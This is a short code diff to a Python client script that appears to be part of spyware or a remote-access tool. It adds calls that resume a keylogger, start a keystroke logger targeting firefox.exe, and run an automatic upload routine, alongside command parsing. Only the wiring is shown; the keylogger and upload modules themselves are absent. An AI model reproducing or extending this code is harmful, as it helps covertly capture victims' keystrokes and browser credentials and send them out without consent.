@@ -4,9 +4,9 @@ import time
 import os
 from logger import log
 
-from clint.commands import parse_command
+from clint.commands import parse_command, start_logger
 from clint.drive import got_active, Auto_upload
-import clint.keylogger as keyloger
+from clint.keylogger import resume_keylogger
 from clint.network import get
 from clint.util import data_store
 from threading import Thread
@@ -16,8 +16,9 @@ print(data_store.var.last_user_time)
 #%%
 Auto_upload()
 got_active()
+resume_keylogger()
 if data_store.var.mozila_keylog:
-    ("firefox.exe")
+    start_logger('mozila', ["firefox.exe"])
     data_store.reset("mozila_keylog")
 
 
